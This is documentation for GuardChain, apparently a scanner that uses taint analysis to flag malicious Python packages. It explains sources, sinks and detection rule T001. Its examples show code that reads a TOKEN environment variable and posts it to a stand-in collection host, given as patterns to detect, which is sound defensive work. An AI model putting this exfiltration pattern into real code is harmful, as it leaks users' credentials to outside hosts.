# Taint Analysis

GuardChain implements lightweight taint analysis. It does not attempt to be a full CodeQL replacement, but it tracks common source-to-sink flows that appear in malicious Python packages.

Sources include environment variables, local secret files, network downloads, and obfuscation decoders. Sinks include dynamic execution, subprocess execution, network exfiltration, and file writes.

Example:

```python
token = os.environ.get("TOKEN")
requests.post("http://example.invalid/collect", data=token)
```

This produces `T001` because a sensitive source reaches a network sink. Evidence includes the source, sink, variable, function, and flow path.

GuardChain also handles simple direct interprocedural cases:

```python
def get_token():
    return os.environ.get("TOKEN")

def send_token():
    token = get_token()
    requests.post("http://example.invalid/collect", data=token)
```

and parameter-to-sink wrappers:

```python
def send_token(token):
    requests.post("http://example.invalid/collect", data=token)

token = os.environ.get("TOKEN")
send_token(token)
```

False positives can happen in telemetry clients or legitimate installers. False negatives can happen when data flow is hidden behind complex interprocedural logic or dynamic dispatch.
